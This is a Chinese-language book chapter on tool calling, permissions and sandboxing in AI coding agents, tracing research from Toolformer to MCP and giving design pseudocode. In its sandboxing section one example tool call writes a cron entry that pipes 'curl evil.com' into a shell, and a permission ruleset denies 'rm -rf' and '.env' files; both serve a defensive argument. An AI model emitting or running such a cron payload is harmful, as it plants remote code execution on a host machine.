# 第4章 Tool / 权限 / 沙箱

> 如果说 Loop 是心脏，Tools 就是四肢。七家的 Tool 系统表面都是"读/写/查/跑 shell"，分水岭在**可见性、审批、沙箱与并行**。本章把这一层彻底剖开：从 Toolformer 到 MCP 的四年演进，为什么"规格与执行必须同源"，如何用可见性分级把首轮 token 压到 1/5，再用横切权限与沙箱把副作用关进笼子，最后用九家源码对证给出选型答案。

---

## 4.1 历史脉络与论文 Lineage：从"会说话"到"会动手"

Tool 的本质是让自回归的"文本生成器"获得**可验证的副作用**。这条线的分水岭不是 2023-06 的 Function Calling，而是更早的"模型能否学会何时调用 API"的预训练探索。

### 4.1.1 时间线总览

```
2020  GPT-3 API              模型只会补全文本，工具在提示词外
  │
2023-02 Toolformer (Schick et al., Meta)  ─┐
2023-05 Gorilla (Patil et al., Berkeley)     │  "自监督学会调用工具"
2023-07 ToolLLM / ToolBench (Qin et al.)     │   16k+ 真实 API, DFSDT 搜索
2023-06 Function Calling (OpenAI)          ─┘   结构化 tool_calls 进入 Chat Completions 协议
  │
2022–2023 ReAct / ART / RestGPT           思维链 + 工具交织的推理范式
  │
2024-02 BFCL v1 (Berkeley Function Calling Leaderboard)  首次系统化评测 AST/可执行性
2024-08 BFCL v2 + ToolSandbox             多轮、多步、并行、幻觉工具的鲁棒性评测
  │
2024-11 MCP (Model Context Protocol, Anthropic)  工具发现/传输/权限的标准化
2025    MCP Registry + Tool Search        工具从"静态注册"走向"运行时发现"
  │
沙箱与隔离 lineage（并行演进）:
2017  bubblewrap (bwrap, Flatpak) ─── 2018 gVisor (Google, user-space kernel) ─── 2019 worktree (git worktree 隔离)
  └─► 2023 Claude SandboxManager(@anthropic-ai/sandbox-runtime)
  └─► 2023 Codex linux-sandbox/bwrap + execpolicy
  └─► 2025 Grok xai-fast-worktree (btrfs/overlay 抄写时复制)
```

| 年代 | 里程碑 | 核心贡献 | 对 Agent Tool 设计的遗产 |
|------|--------|----------|--------------------------|
| 2023-02 | **Toolformer** (arXiv:2302.04761) | 自监督：在无标注语料上让 LM 学会插入 `[API_CALL]`；通过执行结果的 perplexity 增益过滤样本 | 证明"何时调工具"可被**预训练学会**，奠定工具感知的预训练范式 |
| 2023-05 | **Gorilla** (Berkeley, arXiv:2305.15334) | 1,600+ API 的检索增强生成；AST 准确率评测；用 retriever 缩小候选集 | 首次把**检索**引入工具选择，预示后来的 Tool Search / Deferred 加载 |
| 2023-06 | **Function Calling** (OpenAI) | `tools: [{type:function, function:{name,description,parameters}}]` + `tool_calls` + `tool` role 成为协议 | 统一了此后所有 Agent 的**线形**: JSON Schema → 模型采样 → 工具执行 → `tool_result` 回填 |
| 2023-07 | **ToolLLM / ToolBench** (arXiv:2307.16789) | 16k 真实 API, DFSDT 深度优先搜索决策树；Gorilla 的评测维度扩展到多步 | 把单步调用推向**多步规划**，暴露"工具爆炸时模型迷路"问题 |
| 2024-02 | **BFCL v1** | AST 匹配 + 可执行性双轨评测；并行调用、类型约束 | 工具评测从"调得对"进化到"调得全、调得并、调得类型安全" |
| 2024-11 | **MCP** (Anthropic) | `tools/list_tools`, `resources/list_resources`, `prompts` 三类原语；stdio/SSE 传输；OAuth 授权 | 工具从"硬编码"走向**发现式**，权限与沙箱首次进入协议层 |

### 4.1.2 逐篇精读：工具能力的四次跃迁与一次协议化

时间轴是骨架，本节填血肉。每篇按"它反对什么 → 机制怎么运作 → 证据 → 留给今天什么"展开——读完应能回答：**为什么今天的工具长成 JSON Schema + 注册表 + 审批层这个形状，而不是别的形状。**

#### Toolformer (2023)：让模型自己定义"什么时候该调工具"

**困境**：此前让 LLM 用工具有两条笨路：要么全靠 prompt 教（示例写得再多，模型也未必在该调的时候调），要么用人工标注的调用数据微调（标注成本高到不可行）。核心难题是：**怎么在无人标注的情况下，造出"何时调用、如何传参"的训练数据？**

**机制**：Toolformer 的答案是自监督，且过滤标准极其聪明：①先让模型在普通网页语料上采样，随机尝试在文本中间插入 API 调用（计算器、日历、维基搜索、翻译、QA 六类）；②**执行这些调用，把结果插回去，然后比较插入前后模型对后续 token 的 perplexity**——只有当 API 结果显著降低了困惑度（即"这个结果对继续写下去真的有用"），该样本才保留；③用筛出的几千条样本微调 GPT-J 6B。

**证据**：6B 的 Toolformer 在数学应用题上反超比它大一个量级的 GPT-3（175B），LAMA 知识探测大幅领先——因为查询外部世界本来就该赢过死记硬背。更重要的是零样本场景下模型学会了"该问才问"，而不是每句话都插个调用。

**遗产**：那个 perplexity 过滤闭环，就是今天 `tool_result → 影响下一轮采样` 的思想雏形——**工具的价值由"执行结果是否改善下游预测"来定义**。局限：Toolformer 是单轮插入式调用（没有循环、没有多步规划），且训练成本让它停留在研究侧；把"会调工具"产品化的不是后续某篇论文，而是下面这个协议事件。

#### Gorilla (2023)：API 太多记不全——检索进入工具选择

**困境**：真实世界的 API 有几万个且天天变，靠权重记住所有签名必然产生幻觉（编造不存在的参数）。模型能不能像开发者一样——**先查文档再写代码**？

**机制**：Gorilla 做了两件事。其一，构建 **APIBench**（Torch Hub / TensorFlow Hub / HuggingFace 共 1,600+ 条 API）并做**检索感知微调（RAFT）**：训练时故意在 prompt 里附上一份可能含干扰项的检索文档，让模型学会"依赖文档而非记忆"；其二，提出 **AST 匹配评测**——不再比对生成文本的字面相似度，而是解析出抽象语法树后比对函数名与参数结构，这才第一次能客观度量"调用对了没"。

**证据**：带 retriever 的 GPT-4 加 Gorilla 微调显著降低幻觉 API（编造模型名/参数）发生率，且当文档版本更新时表现稳健——模型学会了"以文档为准"。

**遗产**：AST 评测成为后来一切工具基准的地基（BFCL 直接沿用）；"检索缩小候选集"预示了今天的 Tool Search 与 `defer_loading`（Ch4.2.2 可见性分级）——**工具清单不必全量注入，按需检索加载**正是 Groilla 思想的产品化。

#### Function Calling (2023-06, OpenAI)：不是论文的论文——协议化的分水岭

它没有 arXiv 编号，影响却超过前后任何一篇：OpenAI 在 Chat Completions 里新增 `tools[]` 参数与 `tool_calls` 返回字段，把"调工具"从 prompt 技巧升格为**协议原语**。三个设计决定塑造了此后的一切：①工具描述固化为 **JSON Schema**（`parameters: {type:object, properties, required}`）；②模型的调用意图以结构化 `tool_calls{id, function:{name, arguments}}` 返回，`arguments` 是 JSON 字符串；③执行结果以独立的 `tool` role 消息回填。从此 Agent 的主干线形被锁定为：**schema 注入 → 采样产出 tool_calls → 执行 → tool_result 回填 → 再采样**。Anthropic（2023-11）跟进 Messages API 时做了两处改良——`tool_use.input` 为原生 JSON 对象而非字符串、`system` 提升为顶级字段——但线形未变。协议化的代价也随之而来：schema 从此成为上下文预算的一部分（几十个工具的首轮 token 开销，见 4.2.2 可见性分级），而"模型看到的 schema"与"本地执行的 schema"必须同源，否则必漂移（见 4.2.1 同源困境）。

#### ToolLLM (2023)：单步不够了——16k API 上的多步搜索

**困境**：Gorilla 的 1,600 个 API 还是"选一个调一次"；真实任务往往要串联多个 REST API（查航班→比价→订票），而且候选集大到人工整理都不现实。

**机制**：清华团队的 ToolLLM 构建了 **ToolBench**——从 RapidAPI 抓取 16,000+ 真实 API 自动生成指令数据；推理侧提出 **DFSDT**（深度优先搜索式决策树）：不再是"采样一次就定生死"的单链推理，而是把多条推理路径组织成树，走不通就回溯换路——相当于给 Loop 加了一个轻量的"试错-回退"外层；配套 ToolEval 评测器（用 pass rate 与 win rate 度量多步完成质量）与 API 检索器（先从 16k 中召回相关 API 再交给模型）。

**证据**：ToolLLaMA 在 ToolEval 上接近当时 GPT-4 的多步表现，DFSDT 相比链式 CoT 显著提高复杂指令通过率——同时暴露了新问题：**候选一多模型就迷路**，检索器的质量直接决定上限。

**遗产**："大规模候选 + 检索前置 + 失败回溯"三件套分别对应今天的工具市场（MCP Registry）、Tool Search、以及 Loop 层的重试/回退语义。它也是第一个系统展示"工具爆炸"问题的基准——这个问题后来被各家用可见性分级（defer_loading/ToolExposure）正面回应。

#### BFCL (2024—)：评测即规格——从"调得对"到"敢不敢让它调"

Berkeley Function Calling Leaderboard 把前几年的散装评测收拢为持续运营的榜单，它的演进史本身就是工具需求的演进史：**v1（2024-02）**用 AST 匹配评简单/多重/并行三类调用外加"相关性检测"（不该调的时候调了吗）；**v2** 引入可执行评测——在真实环境里跑调用、校验状态变化，语法正确但语义错误（比如写错文件路径）在此现形；**v3** 加入多轮与幻觉工具场景（调用不存在的 API 该怎么办）。这条演进揭示了一个工程真理：**AST 合法 ≠ 可执行 ≠ 应被执行**——`write_file(path="/etc/passwd")` 三关里只会在第三关被拦，而这第三关不属于评测器，属于权限与沙箱（4.1.4）。评测即规格：BFCL 每加一类测试，各家的 Tool 子系统就多一层纵深。

#### MCP (2024-11, Anthropic)：从"注册表"到"生态"——工具的 USB-C 时刻

**困境**：Function Calling 解决了"模型怎么表达调用"，没解决"工具从哪来"。每个 Agent 都自建注册表、自定描述格式、自管鉴权——同一个 Notion 工具要在 Claude/Codex/OpenCode 里各写一遍接入代码，生态完全割裂。

**机制**：MCP（Model Context Protocol）把这层抽成了标准协议：JSON-RPC 2.0 消息格式，三类原语——`tools`（可执行动作）、`resources`（可读数据）、`prompts`（可复用模板）；传输层先是 stdio（本地子进程）、后补 Streamable HTTP（远程服务）；授权直接复用 OAuth 2.1。Server 侧只需实现一次，任何 Client（Agent Host）都能发现并调用其工具——**工具从编译期注册走向运行期发现**。

**证据与采纳**：Anthropic 发布数月内 OpenAI（2025-03）与 Google DeepMind（2025-04）相继宣布支持，本书九家除 Pi 外均原生接入——一个社区协议在一年内成为跨厂事实标准，这在 LLM 生态里是首次。

**遗产**：MCP 把权限问题推到了协议层（server 声明的能力边界、host 侧的审批策略如何叠加，见 4.2.3 权限横切），也带来了新的攻击面（恶意 server 描述注入，见 Ch11 注入线）。它是"工具生态化"的分水岭：此前的竞争在"有没有工具"，之后的竞争在"怎么管理工具"——可见性、审批、沙箱，正是本章后面五根支柱的主场。

### 4.1.3 三条论文 Lineage 的会合

上面六篇分属三条独立的线，它们在 2024 年前后会合并互相成全。理解"谁给谁补了什么"，比记住时间轴更重要：

**Lineage A — 学会工具 (Learn to Use Tools)：**

```
Toolformer (自监督插入 API) → Gorilla (检索 + 微调) → ToolLLM (大规模 API 搜索)
       自监督学会"何时调"          检索学会"调哪个"         搜索学会"怎么调多步"
```

这条线回答"模型的工具能力从哪来"。注意它的演进是**把智能逐步从权重搬到系统**：Toolformer 把"何时调用"焊进权重，Gorilla 发现权重记不住几万个 API、必须外挂检索文档，ToolLLM 干脆让检索器承担主要选择工作。今天生产 Agent 几乎不再为工具能力微调——模型的原生 Function Calling 加上好的描述与检索就够了，这条线的终点恰是"训练不再是必需品"。

**Lineage B — 协议标准化 (Standardize the Interface)：**

```
OpenAI Function Calling (2023-06) → Anthropic Tool Use (2023-11) → MCP (2024-11)
   单轮函数调用协议                    多轮工具交织                     工具发现与授权协议
```

这条线回答"调用怎么表达与发现"。Function Calling 锁定线形（schema→tool_calls→执行→回填），Anthropic 补上多轮交织与原生 JSON 参数，MCP 解决生态互通。它不关心模型聪不聪明，只关心**契约的形状**——所以它能跨模型成立：同一个 MCP server 可以同时服务 GPT 与 Claude。

**Lineage C — 评测与鲁棒性 (Benchmark as Specification)：**

```
BFCL v1 (AST) → BFCL v2 (可执行+并行) → ToolSandbox (状态化) → BFCL v3 (幻觉工具/长上下文)
   语法正确              语义正确               世界模型            对抗鲁棒
```

这条线回答"怎么知道做得好"。BFCL 的演进揭示了一个工程真理：**能通过 AST 评测的工具系统，未必能通过可执行评测**。例如模型生成 `write_file(path="/etc/passwd", content="...")` 在 AST 层合法，在沙箱层应被拦截——这正是权限与沙箱必须"协议之外再加一层"的原因。

三线会合的产物就是本章后面要拆的五根支柱：Lineage A 决定了"描述即接口"（支柱一的同源困境），Lineage C 倒逼出权限与沙箱（支柱三、四），Lineage B 则让可见性与并行（支柱二、五）成为跨厂可比的工程问题。

### 4.1.4 权限与沙箱的独立 Lineage

工具的"能调"与"敢调"是两回事。沙箱技术栈来自容器与操作系统，而非 LLM 领域：

| 技术 | 起源 | 隔离粒度 | 代表 Agent 用法 |
|------|------|----------|-----------------|
| **bubblewrap (bwrap)** | 2017 Flatpak, 自 Linux namespaces | 进程级：mount/net/pid/user namespace，无守护进程 | **Codex** `linux-sandbox/bwrap`：每次 `bash` 调用 fork 出带 `execpolicy` 的沙箱子进程，`--ro-bind / --tmpfs` 精确控制可见文件 |
| **gVisor (runsc)** | 2018 Google, user-space kernel | syscall 拦截：Sentry 进程模拟 Linux 内核 | 云端 Agent 沙箱的理论上限；Grok/Codex 在 K8s 环境的可选后端 |
| **git worktree** | 2015 Git 2.5, 2025 强化为 `btrfs/overlay` | 文件系统级：COW 分支，工作区隔离 | **Grok** `xai-fast-worktree`：利用 `btrfs snapshot` 或 `overlayfs` 在 <100ms 内为每个 subagent 创建隔离工作区，避免并发 `write_file` 冲突 |
| **@anthropic-ai/sandbox-runtime** | 2023 Anthropic 内置 | 进程 + seccomp + 可编程策略 | **Claude Code** `SandboxManager`：Node 侧 `sandbox-runtime` 封装，提供 `allow/deny/ask` 三态审批 |

> 关键分叉：**bwrap 隔离的是"单次工具执行"**（轻、快、每次重建）；**worktree 隔离的是"整个 Agent 会话的可见文件集"**（重、稳、适合并行 subagent）。二者正交，Grok 同时用两者，Codex 选前者，Pi 两者皆无（扩展化）。

---

## 4.2 原理：五根支柱

Tool 子系统的五根支柱——**同源、可见性、权限、沙箱、并行**——缺一即塌。以下逐根拆解，每根给出形式化、伪代码与失败案例。

### 4.2.1 支柱一：规格与执行同源 (ToolSpec ↔ ToolExecutor Co-location)

**问题：Schema 漂移 (Schema Drift)**

若 LLM 可见的 JSON Schema 与本地校验/执行的参数集合分离演进，会出现三类故障：

```
1. 幻觉参数：模型按旧 schema 传 { path: string, encoding: "utf8" }，新执行侧已改名为 { file: string }
   → InvalidArgumentsError，整轮工具调用作废

2. 幽灵工具：模型调用了已卸载的 deferred 工具
   → NoSuchToolError，需 repair_dangling_tool_calls 兜底（Grok 的代价）

3. 类型静默截断：schema 写 { timeout: number }，执行侧做 parseInt 但模型传 3.5
   → 超时语义错乱
```

**正模式：同源注册表 (Co-located Registry)**

```
┌─────────────────────────────────────────┐
│  Tool<Input, Output>  (单一对象)         │
│  ┌──────────────────┐ ┌──────────────┐  │
│  │ spec: ToolSpec   │ │ execute: Fn  │  │
│  │  name            │ │  (args) →    │  │
│  │  description     │ │  Result      │  │
│  │  parameters: Zod │←┤  isReadOnly  │  │
│  │  output_schema?  │ │  isConcurrencySafe │ │
│  └──────────────────┘ └──────────────┘  │
│         ▲                    ▲          │
│         └──── 同一 Def ──────┘          │
└─────────────────────────────────────────┘
         │
    ToolRegistry / ToolRouter
         │
   model_visible_specs()  ← 只暴露可见子集（见 4.2.2）
```

**Schema 示例（以 `read_file` 为例，Zod → JSON Schema）：**

```ts
// 源码形态：Claude src/Tool.ts:362 / OpenCode packages/opencode/src/tool/tool.ts:55
import { z } from "zod";

const ReadFileInput = z.object({
  path: z.string().describe("Absolute or workspace-relative path"),
  offset: z.number().int().min(0).optional().describe("Line offset, 0-indexed"),
  limit: z.number().int().min(1).max(500).optional().describe("Max lines, default 2000"),
});

// 同源对象：spec 与 execute 焊在一起
export const readFileTool = buildTool({
  name: "read_file",
  description: "Read file content as UTF-8. Rejects files >200KB or binary.",
  parameters: ReadFileInput,                          // Zod schema = 单一真源
  jsonSchema: zodToJsonSchema(ReadFileInput),         // 自动派生 JSON Schema 供 LLM
  isReadOnly: true,
  isConcurrencySafe: true,                            // 见 4.2.5
  execute: async ({ path, offset, limit }, ctx) => {
    // 运行时校验复用同一 Zod，无漂移
    const abs = ctx.resolve(path);
    if (await isBinary(abs)) throw new Error("Binary file rejected");
    return await ctx.fs.read(abs, { offset, limit });
  },
});
```

生成的 LLM 可见 JSON Schema（`tool_calls` 协议层）：

```json
{
  "name": "read_file",
  "description": "Read file content as UTF-8. Rejects files >200KB or binary.",
  "parameters": {
    "type": "object",
    "properties": {
      "path": { "type": "string", "description": "Absolute or workspace-relative path" },
      "offset": { "type": "integer", "minimum": 0 },
      "limit": { "type": "integer", "minimum": 1, "maximum": 500 }
    },
    "required": ["path"],
    "additionalProperties": false
  }
}
```

> **对证点**：Codex 把这一约束焊在类型系统层面——`ToolExecutor<Invocation> { fn spec(&self) -> ToolSpec; fn handle(&self, inv: Invocation) -> Result }` (`codex-rs/tools/src/tool_executor.rs:106`)。`spec()` 与 `handle()` 同 trait，编译期即保证"能描述的必能执行"。

**失败案例 1 — Claw 早期 `src/tools.py:96` 的分离式快照：**

```py
# 反模式：schema 在 YAML，执行在 Python，手工同步
def load_tool_snapshot(yaml_path):
    specs = yaml.safe_load(open(yaml_path))  # LLM 可见
    executors = {t.name: import_fn(t.module) for t in specs}  # 执行侧
    # 无编译期检查，某次重命名 write_file → write_files 后，模型仍按旧名调用
```

症状：批量 `InvalidArgumentsError`，需 Grok 式的 `repair_dangling_tool_calls` 启动时全量扫描自愈，成本高。

### 4.2.2 支柱二：可见性分级 (ToolExposure) — 首轮 Token 预算的生死线

**动机：首轮预算不等式**

```
设模型窗口 W = 200K, 系统提示 S = 8K, 用户输入 U = 2K, 保留输出 R = 8K
则工具描述可用预算 B = W - S - U - R - 历史 ≈ 20K (真实值见 Ch5)

若有 N=40 个工具，平均每个工具描述 D=600 tokens，则全量暴露成本 = N*D = 24K > B
→ 首轮即超预算，触发 PTL (Prompt Too Long) 或被迫截断历史

解法：分级暴露，让模型首轮只看到"目录"，按需加载"正文"
```

**Codex 的四级模型（最精细，`codex-rs/tools/src/tool_spec.rs:20` + `core/src/tools/spec_plan.rs:117`）：**

```rust
// codex-rs/tools/src/tool_spec.rs:20
pub enum ToolExposure {
    Direct,        // 首轮即暴露完整 schema，常驻
    Deferred,      // 首轮仅暴露存根（name + one-line description），需 ToolSearch 激活
    CodeModeOnly,  // 仅在 code 模式暴露（plan 模式不可见）
    Hidden,        // 永不暴露给模型，仅内部调用
}
```

**暴露度算法伪代码（综合 Codex `build_tool_router()` + Claude `defer_loading`）：**

```ts
// 伪代码：每 StepContext 重建 ToolRouter，保证快照一致性
type ToolDef = { name: string; exposure: ToolExposure; spec: ToolSpec; execute: Fn };

function buildToolRouter(
  ctx: StepContext,               // 含 mode, approvalPolicy, mcpServers
  allTools: ToolDef[],
  query: string | null,           // 用户当前输入，用于检索式激活
): ToolRouter {
  const router = new ToolRouter();

  // 1. 分级过滤：决定本轮模型可见的 specs
  for (const tool of allTools) {
    switch (tool.exposure) {
      case "Direct":
        router.addSource(tool.name, tool); break;
      case "Deferred":
        // 首轮仅注册存根，不占预算
        router.addStub(tool.name, { description: tool.spec.oneLiner });
        break;
      case "CodeModeOnly":
        if (ctx.mode === "code") router.addSource(tool.name, tool);
        break;
      case "Hidden":
        router.addHidden(tool.name, tool); break; // 模型永不可见
    }
  }

  // 2. 检索式激活（Claude ToolSearch / Codex ToolSearchTool）
  if (query) {
    const hits = semanticSearch(query, allTools.filter(t => t.exposure === "Deferred"));
    for (const h of hits.slice(0, 5)) {           // Top-K 限制，避免二次爆炸
      router.promoteToDirect(h.name);              // 存根 → 完整 schema
    }
  }

  // 3. MCP 动态注入（每轮重建，防止悬垂）
  for (const server of ctx.mcpServers) {
    for (const spec of server.listTools()) {
      router.addSource(mcpNamespaced(spec.name, server.id), spec);
    }
  }

  // 4. 一致性快照：落盘 model_visible_specs，供下一轮校验
  router.finalize();                               // 冻结
  ctx.snapshot.modelVisibleSpecs = router.modelVisibleSpecs();
  return router;
}

// 校验：模型返回的 tool_calls 必须在 snapshot 内
function validateToolCall(call: ToolCall, snapshot: string[]): boolean {
  if (!snapshot.includes(call.name)) {
    // 触发 repair_dangling_tool_calls 或直接返回 NoSuchToolError 给模型自愈
    return false;
  }
  return true;
}
```

**预算对比（实测估算，`chars/4`）：**

| 策略 | 首轮可见工具数 | 首轮工具 token | 节省 | 代价 |
|------|---------------|---------------|------|------|
| 全量 Direct (40 工具) | 40 | ~24,000 | — | 首轮即触发 compaction |
| Codex 分级 (8 Direct + 32 Deferred 存根) | 8 + 32×20 | ~6,400 | **73%** | 需一次 ToolSearch 往返 |
| Claude `defer_loading` (6 Direct + 懒加载) | 6 | ~3,600 | **85%** | 首次调用某类工具多一 hop |

> **30 秒陈述**："可见性分级的本质是**用一次额外的 LLM 往返换首轮预算**。当 N>15 时必做；N<10 时 Direct 即可，过度分级反而增加延迟。"

### 4.2.3 支柱三：权限是横切面 (Cross-Cutting Permission)

**反模式：散弹式权限检查**

```ts
// 反模式：在每个工具内部分散检查
async function writeFile(args) {
  if (!allowed(args.path)) throw new PermissionDenied(); // 每个工具各自实现
  // ...
}
async function bash(args) {
  if (!allowed(args.command)) throw new PermissionDenied(); // 规则重复，易遗漏
  // ...
}
// 新增工具时易忘加检查 → 提权漏洞
```

**正模式：编排器统一拦截（七家一致）**

```
用户输入 → Loop
  → buildToolRouter (可见性)
  → callModel → tool_calls[]
  → ┌─────────────────────────────────┐
     │ ToolOrchestrator (统一拦截)      │
     │  1. Approval 审批               │ ← PermissionContext / AskForApproval
     │  2. Sandbox 沙箱决策            │ ← sandboxing.rs / SandboxManager
     │  3. Execute 执行                │
     │  4. Hook 后处理 (truncation)    │
     └─────────────────────────────────┘
  → tool_results[] → 回填 Context
```

**权限晶格 (Permission Lattice)：**

```
                     ┌─────────────┐
                     │   Policy    │
                     │  (合并后)   │
                     └──────┬──────┘
                            │ merge(defaults, user, session)
              ┌─────────────┼─────────────┐
              │             │             │
       ┌──────▼──────┐ ┌───▼────┐ ┌─────▼─────┐
       │   Allow     │ │ Deny   │ │   Ask     │
       │ (白名单)    │ │ (黑名单)│ │ (需确认)  │
       └──────┬──────┘ └───┬────┘ └─────┬─────┘
              │            │            │
              └────────────┼────────────┘
                           │
              ┌────────────▼────────────┐
              │  决策 (per tool_call)   │
              │  Deny > Ask > Allow     │  ← 晶格序：Deny 覆盖一切
              │  细粒度匹配优先          │
              └────────────┬────────────┘
                           │
              ┌────────────▼────────────┐
              │  执行路径               │
              │  Allow → 沙箱→执行      │
              │  Ask   → 弹确认→用户决策 │
              │  Deny  → 直接返回        │
              │         PermissionDenied │
              └─────────────────────────┘
```

**细粒度匹配示例（Claude `ToolPermissionContext` + Codex `ExecApprovalRequirement`）：**

```ts
// PermissionV1.Ruleset 形态（OpenCode packages/opencode/src/agent/agent.ts:120）
// Claude ToolPermissionContext{mode, additionalWorkingDirectories, allow/deny/ask}
const permissionRuleset = {
  // 全局默认
  defaults: {
    "read": "allow",                    // 读文件默认放行
    "write": "ask",                     // 写文件默认询问
    "bash": "ask",
    "*.env": "deny",                    // 敏感文件一律拒绝（晶格顶）
    "bash(git *)": "allow",             // git 只读命令白名单（细粒度优先）
    "bash(npm test)": "allow",
    "bash(rm -rf *)": "deny",           // 危险命令黑名单
    "question": "allow",                // ask_user_question 始终允许
    "plan_enter": "allow",
    "plan_exit": "ask",
  },
  // 用户覆盖（~/.claude/settings.json）
  user: {
    "write": "allow",                   // 用户信任写操作
    "bash(cargo *)": "allow",
  },
  // 会话覆盖（本次 /plan 模式）
  session: {
    "write": "deny",                    // plan 模式禁止写入
    "bash(*)": "deny",
  },
  // 合并策略：Deny > Ask > Allow，同级细粒度 > 通配
  // 最终 write 在 plan 模式 = deny（session 覆盖 user）
};

// 决策伪代码
function decidePermission(toolCall: ToolCall, ctx: PermissionContext): Decision {
  const candidates = ruleset.match(toolCall); // 按特异度排序：bash(git *) > bash(*) > *
  const top = candidates[0];
  if (!top) return { action: "ask", reason: "no rule" };
  if (top.effect === "deny") return { action: "deny", reason: top.pattern };
  if (top.effect === "ask")  return { action: "ask",  tool: toolCall.name };
  return { action: "allow", sandbox: policyFor(toolCall) };
}
```

> **对证点**：Grok 的 `ToolServerConfig{tools: Vec<ToolConfig{id,kind,params}}}` + `kind_for(vendorName)` 兼容 Claude/Cursor 的 allowlist 文件（`~/.claude.json`），`ensure_plan_mode_tools(enter/exit/ask_user_question)` 在 plan 模式强制注入三工具，是"权限即配置"的典型——权限规则本身也是可序列化的配置，可被 worktree 隔离。

### 4.2.4 支柱四：沙箱隔离模型 (Sandbox Isolation)

沙箱回答"**即便权限放行，执行的副作用能否被关住**"。三层递进：

```
权限 (Permission)  →  决策"能否调"
沙箱 (Sandbox)     →  限制"调了能做什么"
工作区 (Worktree)  →  隔离"做完影响谁"
```

**沙箱时序图（以 Codex `bwrap` + Claude `SandboxManager` 为蓝本）：**

```
Model                Orchestrator           Permission          SandboxManager         ToolExecutor        FS
  │                       │                      │                     │                    │              │
  │  tool_calls{bash}     │                      │                     │                    │              │
  │──────────────────────►│                      │                     │                    │              │
  │                       │  decide(bash)        │                     │                    │              │
  │                       │─────────────────────►│                     │                    │              │
  │                       │  Ask? allow? deny?   │                     │                    │              │
  │                       │◄─────────────────────│                     │                    │              │
  │                       │                      │                     │                    │              │
  │                       │  sandboxAttempt?     │                     │                    │              │
  │                       │───────────────────────────────────────────►│                    │              │
  │                       │  execpolicy{         │                     │                    │              │
  │                       │    ro-bind:/usr,     │                     │                    │              │
  │                       │    tmpfs:/tmp,       │                     │                    │              │
  │                       │    net:off }         │                     │                    │              │
  │                       │◄───────────────────────────────────────────│                    │              │
  │                       │                      │                     │                    │              │
  │                       │  bwrap --ro-bind /usr /usr                │                    │              │
  │                       │        --tmpfs /tmp --unshare-net          │                    │              │
  │                       │        -- bash -c "npm test"               │                    │              │
  │                       │────────────────────────────────────────────────────────────────►│              │
  │                       │                      │                     │                    │────►│        │
  │                       │                      │                     │                    │◄────│        │
  │                       │  result{stdout, exitCode}                  │                    │              │
  │                       │◄────────────────────────────────────────────────────────────────│              │
  │                       │  truncate(output)    │                     │                    │              │
  │                       │  tool_result         │                     │                    │              │
  │◄──────────────────────│                      │                     │                    │              │
  │  tool_result → 下一轮采样                                                                               │
```

**三种沙箱的隔离强度对比：**

| 维度 | bwrap (Codex) | sandbox-runtime (Claude) | worktree (Grok) |
|------|---------------|--------------------------|-----------------|
| 隔离对象 | 单次 `bash` 进程 | 单次工具调用进程 | 整个 subagent 会话的文件集 |
| 技术 | Linux namespaces (mount/pid/net/user) | namespaces + seccomp-bpf | `btrfs snapshot` / `overlayfs` COW |
| 启动成本 | ~10ms (fork + ns) | ~20ms | ~50-100ms (snapshot) |
| 网络 | `--unshare-net` 可选关闭 | 策略控制 | 继承宿主，可选隔离 |
| 文件 | `--ro-bind` 只读挂载 + `--tmpfs` 临时层 | allow/deny 路径列表 | COW 分支，写时复制，不污染主 worktree |
| 适用 | 本地 CLI 高频短命令 | 本地 CLI 中频工具 | 云端/CI 并行 subagent |

> **选型公式**：
> - 本地单 Agent + 高频 `bash` → `bwrap`（每次重建，无状态，最轻）
> - 本地复杂工具链 → `sandbox-runtime`（策略可编程，一次配置多工具复用）
> - 云端多 subagent 并行 → `worktree`（文件级隔离，避免 `write_file` 并发冲突）+ `bwrap` 双层

**失败案例 2 — 无沙箱的 `write_file` 路径穿越：**

```ts
// 模型生成
{ name: "write_file", arguments: { path: "../../../etc/cron.d/pwn", content: "* * * * * curl evil.com | sh" } }

// 若仅靠权限字符串匹配 "write": "ask"，而无沙箱的 mount 隔离，
// 用户误点"允许"即造成宿主机提权。
// 正解：沙箱层 --ro-bind 将宿主机 /etc 以只读挂载，即使权限放行也无法写入
```

### 4.2.5 支柱五：并行正确性 (isConcurrencySafe)

**为什么默认串行是安全的悲观选择：**

```
设工具集 T = { read_file, write_file(path=A), write_file(path=B), bash(rm -rf) }
若并行执行 [write_file(A), write_file(A)] → 写后读不确定（lost update）
若并行执行 [bash(rm -rf), read_file]      → 读到半删除文件
→ 副作用工具的并行需要"可交换性"证明，而非"能并就行"
```

**并发安全矩阵（Claude `src/Tool.ts:362` 的 `isConcurrencySafe` 语义）：**

| 工具 | isReadOnly | isConcurrencySafe | 可并行 | 原因 |
|------|------------|-------------------|--------|------|
| `read_file` | ✅ | ✅ | ✅ | 无副作用，多次读可交换 |
| `list_dir` | ✅ | ✅ | ✅ | 读目录，无副作用 |
| `write_file` (同路径) | ❌ | ❌ | ❌ | 写冲突，结果不确定 |
| `write_file` (不同路径) | ❌ | ❌* | ⚠️ | 路径不同但仍标记不安全，需上层去重 |
| `bash(npm test)` | ❌ | ❌ | ❌ | 副作用 + 文件写，需串行 |
| `bash(git status)` | ✅ | ✅ | ✅ | 只读 git 命令可显式标记安全 |

> `*` Claude 默认 `isConcurrencySafe=false`（`buildTool()` 默认值），即便 `write_file` 到不同路径也不自动并行，需 Orchestrator 做路径去重后才敢并行——这是"悲观正确性"的体现。

**并行编排伪代码（Claude `StreamingToolExecutor` + `ToolOrchestrator`）：**

```ts
async function orchestrate(toolCalls: ToolCall[], registry: ToolRegistry): Promise<ToolResult[]> {
  // 1. preflight 阶段：串行审批与沙箱决策（绝不并发，避免竞态）
  const preflights = [];
  for (const call of toolCalls) {
    const tool = registry.get(call.name);
    const decision = await decidePermission(call, ctx);   // 串行
    const sandbox = await sandboxManager.prepare(call, decision); // 串行
    preflights.push({ call, tool, decision, sandbox });
  }

  // 2. 分桶：安全 vs 不安全
  const safe: typeof preflights = [];
  const unsafe: typeof preflights = [];
  for (const p of preflights) {
    if (p.tool.isReadOnly && p.tool.isConcurrencySafe && p.decision.action === "allow") {
      safe.push(p);
    } else {
      unsafe.push(p);
    }
  }

  // 3. 执行：安全桶并行，不安全桶串行
  const safeResults = await Promise.all(safe.map(p => executeWithSandbox(p)));
  const unsafeResults: ToolResult[] = [];
  for (const p of unsafe) {
    unsafeResults.push(await executeWithSandbox(p));      // 串行，一个接一个
  }

  // 4. 按原始 tool_calls 顺序回填（保证与 model 的 tool_call_id 对齐）
  return interleaveByOriginalOrder(toolCalls, safeResults, unsafeResults);
}
```

